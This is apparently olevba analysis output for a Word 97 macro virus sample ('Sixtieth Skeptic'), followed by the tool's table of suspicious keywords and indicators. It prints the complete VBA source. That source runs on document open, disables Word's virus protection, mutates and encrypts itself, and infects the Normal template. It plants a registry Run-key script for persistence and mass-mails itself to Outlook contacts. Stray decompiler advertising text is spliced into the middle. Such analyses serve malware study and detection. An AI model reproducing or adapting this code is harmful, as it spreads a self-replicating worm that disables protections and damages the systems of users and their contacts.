olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.e-af0e7d10e6b5773273afea36996518896a01db2b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Antisocial.e-af0e7d10e6b5773273afea36996518896a01db2b 
in file: Virus.MSWord.Antisocial.e-af0e7d10e6b5773273afea36996518896a01db2b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wm97.SixtiethSkeptic by Lys Kovick

Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 53: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For x = 3 To Len(I): B$ = Asc(Mid(I, x, 1)) - f: C$ = C$ & Chr(B$): Next x: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call Sixtieth_Skeptic: End Sub
Private Sub Sixtieth_Skeptic()
On Error GoTo Quit: Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0: Options.VirusProtection = 0
Set CM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
For d = 6 To 53: C$ = "": I = (CM.Lines(d, 1))
f = Int(Rnd * 8) + 1: For x = 1 To Len(I): B$ = Asc(Mid(I, x, 1)) + f: C$ = C$ & Chr(B$): Next x: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, "'" & f & A: Next d
MC = CM.Lines(1, CM.CountOfLines)
AD.DeleteLines 1, AD.CountOfLines: AD.AddFromString MC
NT.DeleteLines 1, NT.CountOfLines: NT.AddFromString MC
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Sixtieth Skeptic") = "C:\SS.VBS" Then GoTo Quit
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Sixtieth Skeptic") = "C:\SS.VBS"
Open "C:\SS.BAS" For Output As #1: Print #1, MC: Close #1
Open "C:\SS.VBS" For Output As #1
Print #1, "Set SS = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "SS.Options.VirusProtection = 0: SS.Options.SaveNormalPrompt = 0: SS.Options.ConfirmConversions = 0"
Print #1, "For x = 1 To SS.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "SS.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1": Print #1, "Next"
Print #1, "SS.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\SS.BAS" & Chr(34) & ")"
Print #1, "SS.Application.Quit": Close #1
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Sixtieth Skeptic") <> "Where's Jamie?" Then
Set objOL = CreateObject("Outlook.Application")
Set MN = objOL.GetNameSpace("MAPI")
If objOL = "Outlook" Then
MN.Logon "profile", "password"
For y = 1 To MN.AddressLists.Count
Set AddyBook = MN.AddressLists(y)
x = 1
Set MV = objOL.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
MV.Recipients.ADD Peep
x = x + 1
If x > 60 Then oo = AddyBook.AddressEntries.Count
Next oo
MV.Subject = "Important Message From " & Application.UserName
MV.Body = "Look what I found..."
MV.Attachments.ADD ThisDocument.FullName
MV.Send
Peep = ""
Next y
MN.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Sixtieth Skeptic") = "Where's Jamie?"
End If
Quit: '//Do Not Distribute! Sixtieth Skeptic By Lys Kovick
End Sub

<br> This file is decompiled by an unregistered version of ChmDecompiler. <br>
 Regsitered version does not show this message. <br>You can download ChmDecompiler at :
    <a href="http://www.zipghost.com/" target=_blank> http://www.zipghost.com/ </a>
    <br><br>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.zipghost.|URL                                          |
|          |com/                |                                             |
|IOC       |SS.VBS              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

